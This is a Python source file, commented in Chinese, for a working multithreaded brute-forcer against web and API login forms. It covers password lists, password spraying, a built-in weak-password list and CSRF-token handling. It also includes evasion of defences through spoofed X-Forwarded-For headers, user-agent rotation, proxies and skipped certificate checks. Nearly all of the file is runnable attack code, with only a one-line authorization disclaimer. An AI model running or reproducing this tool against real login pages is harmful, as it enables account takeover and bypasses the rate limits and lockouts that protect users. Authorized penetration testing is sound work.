#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP 表单并发爆破器 (零依赖, 纯标准库)
=====================================
对 Web 登录/API 认证接口做**在线密码爆破**。只用 Python 标准库 (urllib/threading),
无需 pip 安装任何库。

特性:
    - 并发线程爆破 (-t), 命中即停可选 (--stop-on-hit)
    - 表单 (urlencoded) 与 JSON 两种 body 模式
    - 成功判定: 失败标记 / 命中标记 / 状态码 / 默认启发式
    - 防封/绕过: 随机 X-Forwarded-For (--xff)、随机 UA 轮换、代理 (--proxy)、
      每请求延时 (--delay)
    - CSRF/动态 token: --csrf-url + --csrf-regex 先取 token 再注入 ^TOKEN^
    - 自检模式 (--selftest): 本地起一个假登录服务端到端验证

用法:
    # 单用户名 × 密码字典 (最常见)
    python http_brute.py -u admin -P pass.txt \
        --url https://target/login --data "username=^USER^&password=^PASS^" \
        --fail-marker "用户名或密码错误"

    # 用户字典 × 单密码 (密码喷射, 防锁定)
    python http_brute.py -L users.txt -p 'Spring2025!' \
        --url https://target/login --data "user=^USER^&pass=^PASS^" \
        --fail-marker "Invalid" -t 5 --delay 0.3

    # 用户 × 密码 笛卡尔积 + XFF 轮换 + 命中即停
    python http_brute.py -L users.txt -P pass.txt --url ... --data ... \
        --fail-marker "Invalid" --xff --stop-on-hit

    # JSON 登录
    python http_brute.py -u admin -P pass.txt \
        --url https://api.target/login --json --data '{"u":"^USER^","p":"^PASS^"}' \
        --found-marker "token"

    # 带 CSRF token (先 GET 取 token, 再爆破)
    python http_brute.py -u admin -P pass.txt --url https://target/login \
        --data "csrf=^TOKEN^&user=^USER^&pass=^PASS^" \
        --csrf-url https://target/login --csrf-regex 'name="csrf" value="([^"]+)"' \
        --fail-marker "Invalid"

    # 内置弱口令字典 (无需 -P): --weakpass [分类, 逗号分隔; 不填=全部]
    python http_brute.py -u admin --weakpass --url https://target/login \
        --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 10 --xff --stop-on-hit
    python http_brute.py -u root --weakpass service,db --url ... --data ... --fail-marker "Invalid"

    # 走 Burp 代理调试
    python http_brute.py -u admin -P pass.txt ... --proxy http://127.0.0.1:8080

    # 自检 (无需网络)
    python http_brute.py --selftest

⚠️ 仅用于已获书面授权的渗透测试; 爆破前确认授权范围与限流策略, 避免触发账号锁定。
"""
import argparse
import concurrent.futures as cf
import itertools
import os
import random
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
]

_print_lock = threading.Lock()
_progress = itertools.count(1)
_attempt_total = 0
_hits = []
_hit_event = threading.Event()


# --------------------------------------------------------------------------
# HTTP 层
# --------------------------------------------------------------------------
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """禁用自动跟随重定向: 3xx 状态码直接返回 (便于按 302 判定成功)。"""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_opener(cookiejar, proxy=None, no_verify=False, no_redirect=False):
    handlers = [urllib.request.HTTPCookieProcessor(cookiejar)]
    if proxy:
        handlers.append(urllib.request.ProxyHandler({'http': proxy, 'https': proxy}))
    if no_verify:
        ctx = ssl._create_unverified_context()
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    if no_redirect:
        handlers.append(_NoRedirect())
    return urllib.request.build_opener(*handlers)


def do_request(opener, url, data_bytes, headers, timeout):
    """发一次请求, 返回 (status, body_str)。异常返回 (0, '')."""
    req = urllib.request.Request(url, data=data_bytes, headers=headers, method='POST' if data_bytes is not None else 'GET')
    try:
        with opener.open(req, timeout=timeout) as resp:
            status = resp.status
            body = resp.read().decode('utf-8', errors='replace')
            return status, body
    except urllib.error.HTTPError as e:
        # HTTPError 也是"有效响应", 带上 body 便于按内容判定
        body = e.read().decode('utf-8', errors='replace')
        return e.code, body
    except Exception:
        return 0, ''


def make_headers(xff, ua):
    h = {'User-Agent': ua}
    if xff:
        h['X-Forwarded-For'] = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        h['X-Real-IP'] = h['X-Forwarded-For']
    return h


def rand_ip():
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


WEAKPASS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wordlists', 'weakpass.txt')


def _read_words(path):
    """读字典文件: 跳过空行与 # 注释。"""
    if not path:
        return []
    return [l.strip() for l in open(path, encoding='utf-8', errors='replace')
            if l.strip() and not l.strip().startswith('#')]


def load_weakpass(cat_filter=''):
    """读取内置弱口令字典 wordlists/weakpass.txt。
    文件内 `## 分类名` 标记分类; `#` 为注释。
    cat_filter: 逗号分隔分类名 (web/service/db/middleware), 空=全部。"""
    cats = {c.strip() for c in cat_filter.split(',') if c.strip()} if cat_filter else None
    cur, out = None, []
    with open(WEAKPASS_FILE, encoding='utf-8', errors='replace') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if line.startswith('##'):
                cur = line[2:].strip()
                continue
            if line.startswith('#') or cur is None:
                continue
            if cats and 'all' not in cats and cur not in cats:
                continue
            out.append(line)
    return out


# --------------------------------------------------------------------------
# 爆破核心
# --------------------------------------------------------------------------
def render(template, user, password, token, json_mode):
    """替换 ^USER^/^PASS^/^TOKEN^ 占位符。表单模式自动 urlencode 值。"""
    def enc(v):
        return v if json_mode else urllib.parse.quote_plus(v)
    return (template
            .replace('^USER^', enc(user))
            .replace('^PASS^', enc(password))
            .replace('^TOKEN^', enc(token)))


def fetch_token(opener, csrf_url, csrf_regex, timeout):
    """GET csrf_url 用正则提取 token (供 ^TOKEN^ 占位符)。"""
    try:
        req = urllib.request.Request(csrf_url, headers={'User-Agent': random.choice(UA_LIST)})
        with opener.open(req, timeout=timeout) as resp:
            html = resp.read().decode('utf-8', errors='replace')
        m = re.search(csrf_regex, html)
        if not m:
            print(f"[-] 未从 {csrf_url} 提取到 token (正则未命中)")
            return None
        token = m.group(1)
        print(f"[*] CSRF token 已获取: {token[:12]}…")
        return token
    except Exception as e:
        print(f"[-] 获取 CSRF token 失败: {e}")
        return None


def _classify(status, body, args):
    """返回: True=命中成功, False=失败, None=不确定(默认启发式候选)。"""
    if args.found_marker and any(m in body for m in args.found_marker):
        return True
    if args.fail_marker:
        # 任一失败标记出现 → 失败; 全部未出现 → 命中
        return not any(m in body for m in args.fail_marker)
    if args.found_status:
        return status in args.found_status
    if args.json and status == 200:
        return None if args.warn_no_marker else True
    return None


def worker(job, args, opener, token):
    user, password = job
    url = render(args.url, user, password, token, args.json) if args.in_url else args.url
    data = render(args.data, user, password, token, args.json).encode('utf-8')
    headers = make_headers(args.xff, random.choice(UA_LIST))
    if args.header:
        for h in args.header:
            k, _, v = h.partition(':')
            if k and v:
                headers[k.strip()] = v.strip()
    headers['Content-Type'] = 'application/json' if args.json else 'application/x-www-form-urlencoded'
    status, body = do_request(opener, url, data, headers, args.timeout)

    verdict = _classify(status, body, args)
    n = next(_progress)
    if args.verbose:
        with _print_lock:
            print(f"[.] {n} {user}:{password} -> {status} len={len(body)}"
                  + (f" {'HIT?' if verdict else ''}" if verdict is None else ''))
    if verdict:
        with _print_lock:
            _hits.append((user, password, status))
            print(f"[+] 命中!  user={user}  pass={password}  (status={status})")
        if args.stop_on_hit:
            _hit_event.set()
    if n % 500 == 0 and not args.verbose:
        with _print_lock:
            print(f"[*] 已尝试 {n} 次 ...")


def run(args):
    global _attempt_total
    # ---- 校验参数 ----
    if not args.url or '^USER^' not in (args.data or '') + (args.url if args.in_url else ''):
        print("[-] 需要 --url 且 body/url 中包含 ^USER^ 占位符")
        return 1
    if not any(m for m in [args.found_marker, args.fail_marker, args.found_status]):
        args.warn_no_marker = True
        print("[!] 未指定判定标记, 采用默认启发式 (2xx/3xx=候选), 误报可能高。建议 --fail-marker/--found-marker。")
    else:
        args.warn_no_marker = False

    # ---- 构造任务 ----
    users = [args.user] if args.user else _read_words(args.users)
    if args.password:
        passes = [args.password]
    elif args.passes:
        passes = _read_words(args.passes)
        if args.weakpass is not None:
            print("[!] 已指定 -P 字典, --weakpass 被忽略")
    elif args.weakpass is not None:
        passes = load_weakpass(args.weakpass)
        print(f"[*] 内置弱口令字典: {len(passes)} 条" + (f" (分类: {args.weakpass})" if args.weakpass else " (全部分类)"))
    else:
        sys.exit("[-] 需要 -p 单密码 / -P 密码字典 / --weakpass 内置弱口令字典")
    _attempt_total = len(users) * len(passes)
    if _attempt_total == 0:
        print("[-] 用户/密码列表为空")
        return 1
    jobs = ((u, p) for u in users for p in passes)

    # ---- 一次性准备 (cookie jar + csrf token, 线程共享) ----
    cookiejar = CookieJar()
    token = ''
    if args.csrf_url:
        opener0 = build_opener(cookiejar, args.proxy, args.no_verify)
        token = fetch_token(opener0, args.csrf_url, args.csrf_regex, args.timeout) or ''
    if args.fail_marker:
        print(f"[*] 目标: {_attempt_total} 次尝试, 失败标记={args.fail_marker}, 并发={args.threads}")
    else:
        print(f"[*] 目标: {_attempt_total} 次尝试, 并发={args.threads}")
    t0 = time.time()

    def one_worker(job):
        if _hit_event.is_set():
            return
        if args.delay:
            time.sleep(args.delay)
        opener = build_opener(cookiejar, args.proxy, args.no_verify, no_redirect=not args.follow_redirect)
        worker(job, args, opener, token)

    try:
        with cf.ThreadPoolExecutor(max_workers=args.threads) as ex:
            list(ex.map(one_worker, jobs))
    except KeyboardInterrupt:
        print("\n[!] 手动中断")

    elapsed = time.time() - t0
    print(f"\n[=] 完成: 尝试 {_attempt_total} 次, 耗时 {elapsed:.1f}s, 命中 {len(_hits)} 条")
    for u, p, s in _hits:
        print(f"    {u}:{p} (status={s})")
    return 0


# --------------------------------------------------------------------------
# 自检: 本地起一个假登录服务, 端到端验证
# --------------------------------------------------------------------------
def selftest():
    import http.server

    REAL = ('admin', 'secret123')

    class FakeLogin(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            ln = int(self.headers.get('Content-Length', 0) or 0)
            qs = urllib.parse.parse_qs(self.rfile.read(ln).decode('utf-8', errors='replace'))
            u = qs.get('user', [''])[0]
            p = qs.get('pass', [''])[0]
            if (u, p) == REAL:
                body = b'welcome dashboard'
                self.send_response(200)
            else:
                body = b'Invalid username or password'
                self.send_response(403)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), FakeLogin)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    class A:  # 极简 args 桩
        pass
    a = A()
    a.url = f'http://127.0.0.1:{port}/login'
    a.data = 'user=^USER^&pass=^PASS^'
    a.in_url = False
    a.json = False
    a.user, a.users = 'admin', None
    a.password, a.passes, a.weakpass = None, None, None
    a.found_marker, a.fail_marker, a.found_status = None, ['Invalid'], None
    a.follow_redirect, a.xff, a.header = False, True, []
    a.proxy, a.no_verify, a.timeout = None, False, 5
    a.threads, a.delay = 4, 0
    a.verbose, a.stop_on_hit = False, True
    a.csrf_url, a.csrf_regex = None, None

    # 临时字典: 正确密码藏在里面
    import tempfile
    import os
    fd, pf = tempfile.mkstemp(suffix='.txt')
    with os.fdopen(fd, 'w') as f:
        f.write('wrongpass1\nsecret123\nwrongpass2\n')
    a.passes = pf

    try:
        run(a)
    finally:
        os.unlink(pf)
        srv.shutdown()

    ok = _hits == [('admin', 'secret123', 200)]
    print(f"[{'PASS' if ok else 'FAIL'}] HTTP 爆破自检: 命中={_hits} 期望=[('admin','secret123',200)]")
    sys.exit(0 if ok else 1)


# --------------------------------------------------------------------------
def parse_args(argv):
    ap = argparse.ArgumentParser(
        prog='http-brute',
        description='HTTP 表单/API 在线密码爆破器 (零依赖, 纯标准库)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="占位符: ^USER^ ^PASS^ (表单模式自动 urlencode); 带 CSRF 时可用 ^TOKEN^。")
    ap.add_argument('--selftest', action='store_true', help='本地自检 (无需网络)')
    # 目标
    ap.add_argument('--url', help='登录/认证接口 URL (可用 ^USER^/^PASS^ 占位符)')
    ap.add_argument('--in-url', action='store_true', help='占位符同时替换 URL 本身')
    ap.add_argument('-m', '--method', default='POST', help='请求方法 (默认 POST)')
    ap.add_argument('--data', default='', help='请求体模板, 如 user=^USER^&pass=^PASS^')
    ap.add_argument('--json', action='store_true', help='body 按 JSON 发送 (Content-Type: application/json)')
    ap.add_argument('--header', action='append', default=[], help='附加请求头, 可重复: "Key: value"')
    # 凭据
    ap.add_argument('-u', '--user', help='单用户名')
    ap.add_argument('-L', '--users', help='用户名字典文件 (每行一个)')
    ap.add_argument('-p', '--password', help='单密码')
    ap.add_argument('-P', '--passes', help='密码字典文件 (每行一个, # 注释跳过)')
    ap.add_argument('--weakpass', nargs='?', const='', default=None,
                    help='使用内置弱口令字典 (wordlists/weakpass.txt); 可指定分类, 逗号分隔如 web,db,middleware, 不填=全部; 与 -p/-P 互斥')
    # 成功判定
    ap.add_argument('--fail-marker', action='append', help='失败标记子串 (出现即失败), 可重复')
    ap.add_argument('--found-marker', action='append', help='命中标记子串 (出现即成功), 可重复')
    ap.add_argument('--found-status', help='命中状态码集合, 逗号分隔, 如 200,302')
    # CSRF
    ap.add_argument('--csrf-url', help='先 GET 此 URL 取 token')
    ap.add_argument('--csrf-regex', help='提取 token 的正则 (含一个捕获组)')
    # 速率/绕过
    ap.add_argument('-t', '--threads', type=int, default=10, help='并发线程数 (默认 10)')
    ap.add_argument('--delay', type=float, default=0.0, help='每个请求前延时秒数 (防限流)')
    ap.add_argument('--xff', action='store_true', help='随机伪造 X-Forwarded-For/X-Real-IP')
    ap.add_argument('--timeout', type=float, default=10.0, help='请求超时秒数 (默认 10)')
    ap.add_argument('--proxy', help='HTTP(S) 代理, 如 http://127.0.0.1:8080')
    ap.add_argument('--no-verify', action='store_true', help='跳过 TLS 证书校验')
    ap.add_argument('--follow-redirect', action='store_true', help='跟随重定向 (默认不跟随, 3xx 可见)')
    ap.add_argument('--stop-on-hit', action='store_true', help='命中第一个有效口令后停止')
    ap.add_argument('-v', '--verbose', action='store_true', help='逐条打印请求结果')
    return ap.parse_args(argv)


def main():
    args = parse_args(sys.argv[1:])
    if args.selftest:
        selftest()
        return
    sys.exit(run(args))


if __name__ == '__main__':
    main()
